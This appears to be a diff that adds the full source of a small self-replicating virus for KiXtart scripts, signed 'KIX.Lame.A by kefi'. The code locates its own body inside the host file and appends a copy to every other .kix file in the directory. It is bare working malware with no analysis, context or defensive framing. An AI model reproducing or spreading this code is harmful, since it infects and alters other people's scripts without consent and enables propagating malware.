@@ -1,0 +1,48 @@
+;LAME
+$findfiles = dir("*.kix")
+while $findfiles <> "" and @error = 0
+ $hfile = freefilehandle()
+ if open($hfile, $findfiles) = 0
+  $i = 0
+  $line = readline($hfile)
+  while @error = 0
+   if $line = ";LAME"
+    $begin = $i - 1
+    $virusfile = $findfiles
+   endif
+   $line = readline($hfile)
+   $i = $i + 1
+  loop
+  close($hfile)
+ endif
+ if $findfiles <> $virusfile
+  $allfiles = $allfiles + "[-" + "_]" + $findfiles
+ endif
+ $findfiles = dir()
+loop
+$hfile = freefilehandle()
+open($hfile, $virusfile)
+ for $x = 0 to $begin
+  $line = readline($hfile)
+ next
+ while $err = 0
+  $line = readline($hfile)
+  $virus = $virus + "[-" + "_]" + $line
+  if $line = ";KIX.Lame.A by kefi // 8.26.05"
+   $err = 5
+  endif
+ loop
+close($hfile)
+$hfile = freefilehandle()
+$virlines = split($virus, "[-" + "_]")
+$goatfiles = split($allfiles, "[-" + "_]")
+for each $goat in $goatfiles
+ if $goat <> ""
+  open($hfile, $goat, 4)
+   for each $virline in $virlines
+     writeline($hfile, $virline + chr(13) + chr(10))
+   next
+  close($hfile)
+ endif
+next
+;KIX.Lame.A by kefi // 8.26.05
